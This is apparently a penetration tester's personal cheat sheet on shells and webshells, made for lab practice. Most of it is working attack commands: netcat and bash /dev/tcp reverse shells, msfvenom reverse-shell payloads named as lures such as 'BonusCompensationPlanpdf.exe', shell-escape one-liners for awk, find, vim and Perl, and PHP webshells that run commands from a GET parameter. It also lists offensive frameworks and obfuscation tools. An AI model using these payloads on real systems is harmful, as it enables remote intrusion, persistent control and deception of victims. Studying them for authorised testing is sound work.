#shells #webshells 

* Bind shell is sent **to** the victim **from** the attacker
* Reverse shell is sent **from** the victim **to** attacker
* Webshell is where a web application sends commands to the host system that is executed
* Staged payloads are sent in multiple steps
* Stageless payloads are sent all at once
* Encoding changes the format of the payload until it can be decoded eg b64 encoded
* Encryption of a payload hides its contents until it is decrypted eg AES256
* https://www.revshells.com/

| **Terminal Emulator**                                          | **Operating System**     |
| :------------------------------------------------------------- | :----------------------- |
| [Windows Terminal](https://github.com/microsoft/terminal)      | Windows                  |
| [cmder](https://cmder.app/)                                    | Windows                  |
| [PuTTY](https://www.putty.org/)                                | Windows                  |
| [kitty](https://sw.kovidgoyal.net/kitty/)                      | Windows, Linux and MacOS |
| [Alacritty](https://github.com/alacritty/alacritty)            | Windows, Linux and MacOS |
| [xterm](https://invisible-island.net/xterm/)                   | Linux                    |
| [GNOME Terminal](https://en.wikipedia.org/wiki/GNOME_Terminal) | Linux                    |
| [MATE Terminal](https://github.com/mate-desktop/mate-terminal) | Linux                    |
| [Konsole](https://konsole.kde.org/)                            | Linux                    |
| [Terminal](https://en.wikipedia.org/wiki/Terminal_(macOS))     | MacOS                    |
| [iTerm2](https://iterm2.com/)                                  | MacOS                    |

| **Resource**                      | **Description**                                                                                                                                                                                                                                                                                                   |
| --------------------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `MSFVenom & Metasploit-Framework` | [Source](https://github.com/rapid7/metasploit-framework) MSF is an extremely versatile tool for any pentester's toolkit. It serves as a way to enumerate hosts, generate payloads, utilize public and custom exploits, and perform post-exploitation actions once on the host. Think of it as a swiss-army knife. |
| `Payloads All The Things`         | [Source](https://github.com/swisskyrepo/PayloadsAllTheThings) Here, you can find many different resources and cheat sheets for payload generation and general methodology.                                                                                                                                        |
| `Mythic C2 Framework`             | [Source](https://github.com/its-a-feature/Mythic) The Mythic C2 framework is an alternative option to Metasploit as a Command and Control Framework and toolbox for unique payload generation.                                                                                                                    |
| `Nishang`                         | [Source](https://github.com/samratashok/nishang) Nishang is a framework collection of Offensive PowerShell implants and scripts. It includes many utilities that can be useful to any pentester.                                                                                                                  |
| `Darkarmour`                      | [Source](https://github.com/bats3c/darkarmour) Darkarmour is a tool to generate and utilize obfuscated binaries for use against Windows hosts.                                                                                                                                                                    |
| `Laudanum`                        | [Source](https://github.com/jbarcia/Web-Shells/tree/master/laudanum) Store and execute an encrypted windows binary from inside memory, without a single bit touching disk.                                                                                                                                        |

#### #Netcat 

- `nc -lvnp 7777` set up a listener on port 7777 in verbose mode on server
- `nc -nv 10.129.41.200 7777` connect back on port 7777 to the listener client
- `rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -l 10.129.41.200 7777 > /tmp/f` this sends a bash shell over netcat from server to client, use the standard connect back to receive shell


#### #Powershell 

- ![[image-20240709120417375-Shells.png]]
- ![[image-20240709124814362-Shells.png]]
 

#### #Metasploit 

- `msfconsole` start metasploit
- `search {keyword}` search for modules that have the keyword
- `options` what the options are for the module and the payload
- meterpreter is the command interface to an established session (remote shell)
- `shell` interact with the command shell on target

#### #MSFVenom

- Payload creator mainly for Metasploit
- `msfvenom -l payload` list all the available payloads
- `msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f elf > createbackup.elf` create payload that uses a reverse TCP connection in an ELF executable 
- `msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f exe > BonusCompensationPlanpdf.exe` create payload that uses a reverse TCP connection in an EXE portable executable

### #Bash

- `/bin/sh -i` spawn interactive shell
- `$(bash -c 'bash -i >& /dev/tcp/10.10.14.183/9001 0>&1')` command injection bash reverse shell

### #Perl 
- `perl —e 'exec "/bin/sh";'` use perl binary to spawn shell
- `perl: exec "/bin/sh";` use perl binary to spawn shell


### #Ruby
- `ruby: exec "/bin/sh"` use ruby binary to spawn shell


### #Lua 
- `lua: os.execute('/bin/sh')`  use Lua binary to spawn shell


### #Awk 
- `awk 'BEGIN {system("/bin/sh")}'` use awk binary to spawn shell


### #Find 
- `find / -name nameoffile -exec /bin/awk 'BEGIN {system("/bin/sh")}' \;`
- `find . -exec /bin/sh \; -quit`


### #VIM 
- `vim -c ':!/bin/sh'`
```vim
:set shell=/bin/sh
:shell
```

### #Laudanum

### #php 
- `<?php echo shell_exec($_GET['cmd']); ?>`
- `<?php echo exec($_GET["cmd"]);?>`
- [GitHub - Arrexel/phpbash: A semi-interactive PHP shell compressed into a single file.](https://github.com/Arrexel/phpbash)
- ![[Pasted image 20250421162724.png]]
- `msfvenom -p php/reverse_php LHOST=OUR_IP LPORT=OUR_PORT -f raw > reverse.php`

### #asp 
- ![[Pasted image 20250421162752.png]]